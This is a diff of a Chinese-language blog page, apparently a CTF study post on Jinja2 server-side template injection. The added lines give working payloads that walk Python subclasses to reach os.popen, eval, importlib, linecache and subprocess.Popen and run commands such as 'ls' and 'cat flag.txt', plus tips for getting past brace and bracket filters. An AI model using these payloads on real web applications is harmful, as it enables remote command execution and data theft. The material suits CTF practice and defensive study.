@@ -304,7 +304,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-14 19:17:00" itemprop="dateModified" datetime="2023-05-14T19:17:00+08:00">2023-05-14</time>
+                <time title="修改时间：2023-05-14 21:54:57" itemprop="dateModified" datetime="2023-05-14T21:54:57+08:00">2023-05-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -322,14 +322,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>5k</span>
+              <span>5.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>18 分钟</span>
+              <span>20 分钟</span>
             </span>
 
         </div>
@@ -372,7 +372,7 @@
 <h3 id="危险函数的利用"><a href="#危险函数的利用" class="headerlink" title="危险函数的利用"></a>危险函数的利用</h3><ol>
 <li><p><strong>popen</strong><br><code>popen</code>是<code>os</code>模块中的一个函数,可以实现系统命令执行,但是没有回显,要加上<code>.read()</code>才能回显<br><strong>payload:</strong> <code>__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
 </li>
-<li><p><strong>eval</strong><br>通过<code>__builtins__</code>模块可以调用<code>eval</code>函数,从而实现任意代码执行<br><strong>payload:</strong>  <code>__globals__[&#39;__builtins&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</code></p>
+<li><p><strong>eval</strong><br>通过<code>__builtins__</code>模块可以调用<code>eval</code>函数,从而实现任意代码执行<br><strong>payload:</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__['__glo'+'bals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')&#125;&#125;</code></p>
 </li>
 </ol>
 <h3 id="脚本找危险类"><a href="#脚本找危险类" class="headerlink" title="脚本找危险类"></a>脚本找危险类</h3><p>使用脚本可以快速的定位到某个类对应的编号,<code>__subclasses__()[]</code>将编号写入<code>[]</code>内,就可以定位到指定的类中<br><strong>POST传参:</strong></p>
@@ -400,10 +400,13 @@
 <p>在已经加载os模块的子类里调用os模块<br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></p>
 </li>
 </ol>
-<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h3><p>先用脚本查找危险类,如果可以找到<code>_frozen_importlib.Builtinlmporter</code>,就可以使用这个类的特性<br>这个类可以加载第三方库,使用<code>load_module</code>加载os模块<br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号]["load_module"]("os")["popen"]("ls").read()&#125;&#125;</code></p>
+<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="war类执行命令"><a href="#war类执行命令" class="headerlink" title="war类执行命令"></a>war类执行命令</h3><p>直接上<strong>payload</strong><br><code>&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code><br>在所有子类中查找名称中包含“war”的类，然后使用该类的<code>_module</code>属性来访问<code>__builtins__</code>并导入os模块。然后，它使用os.popen函数运行命令cat flag.txt并读取输出。</p>
+<h3 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h3><p>先用脚本查找危险类,如果可以找到<code>_frozen_importlib.Builtinlmporter</code>,就可以使用这个类的特性<br>这个类可以加载第三方库,使用<code>load_module</code>加载os模块<br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号]["load_module"]("os")["popen"]("ls").read()&#125;&#125;</code></p>
 <h3 id="linecache执行命令"><a href="#linecache执行命令" class="headerlink" title="linecache执行命令"></a>linecache执行命令</h3><p><code>linecache</code>函数可以用于读取任意文件的某一行,由于这个函数中也引入了os模块,使用我们也可以利用这个函数调用os模块从而实现命令执行<br>先用脚本找到危险函数,然后直接引用其中的os即可<br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__.linecache.os.popen("ls").read()&#125;&#125;</code></p>
-<h3 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h3><p>Python中的一个类，它可以用来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。这个类是从Python2.4版本开始引入的，旨在替代其他几个老的模块或函数，比如：<code>os.system</code>, <code>os.spawn*</code>, <code>os.popen*</code>, <code>popen2.*</code>, <code>commands.*</code><br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></p>
-<h3 id="双花括号过滤绕过"><a href="#双花括号过滤绕过" class="headerlink" title="双花括号过滤绕过"></a>双花括号过滤绕过</h3><h3 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4>
+<h3 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h3><p><code>subprocess.Popen</code>是Python中的一个类，它可以用来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。这个类是从Python2.4版本开始引入的，旨在替代其他几个老的模块或函数，比如：<code>os.system</code>, <code>os.spawn*</code>, <code>os.popen*</code>, <code>popen2.*</code>, <code>commands.*</code><br><strong>payload</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></p>
+<h3 id="双花括号过滤绕过"><a href="#双花括号过滤绕过" class="headerlink" title="双花括号过滤绕过"></a>双花括号过滤绕过</h3><p><code>&#123;% %&#125;</code>代替<code>&#123;&#123;&#125;&#125;</code></p>
+<h3 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><h4 id="脚本盲注"><a href="#脚本盲注" class="headerlink" title="脚本盲注"></a>脚本盲注</h4><h3 id="中括号过滤绕过"><a href="#中括号过滤绕过" class="headerlink" title="中括号过滤绕过"></a>中括号过滤绕过</h3><p><code>__getitem()__</code>代替<code>[]</code></p>
+
       
     </div>
 
@@ -1777,7 +1780,7 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:01</span>
+    <span title="站点阅读时长">4:03</span>
 </div>
 
 <!--
